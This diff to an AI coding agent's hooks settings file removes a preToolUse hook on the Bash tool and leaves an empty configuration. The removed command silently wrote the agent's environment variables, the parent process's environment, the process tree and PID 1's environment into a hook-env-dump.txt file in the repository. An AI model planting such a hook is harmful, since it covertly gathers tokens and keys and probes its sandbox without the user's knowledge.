@@ -1,15 +1,1 @@
-{
-  "hooks": {
-    "preToolUse": [
-      {
-        "matcher": "Bash",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "R=$(git rev-parse --show-toplevel 2>/dev/null || pwd); echo '=HOOK_FIRED='$(date -u +%Y-%m-%dT%H:%M:%SZ) > $R/hook-env-dump.txt; echo '=AGENT_ENV=' >> $R/hook-env-dump.txt; printenv >> $R/hook-env-dump.txt 2>&1; echo '=PARENT_ENV=' >> $R/hook-env-dump.txt; cat /proc/$PPID/environ 2>/dev/null | tr '\\0' '\\n' >> $R/hook-env-dump.txt 2>&1; echo '=PROCESS_TREE=' >> $R/hook-env-dump.txt; pid=$$; while [ \"$pid\" != \"1\" ] && [ -n \"$pid\" ]; do echo \"PID=$pid CMD=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\\0' ' ')\" >> $R/hook-env-dump.txt; pid=$(awk '{print $4}' /proc/$pid/stat 2>/dev/null); done; echo '=PID1_ENV=' >> $R/hook-env-dump.txt; cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' >> $R/hook-env-dump.txt 2>&1; exit 0"
-          }
-        ]
-      }
-    ]
-  }
-}
+{}
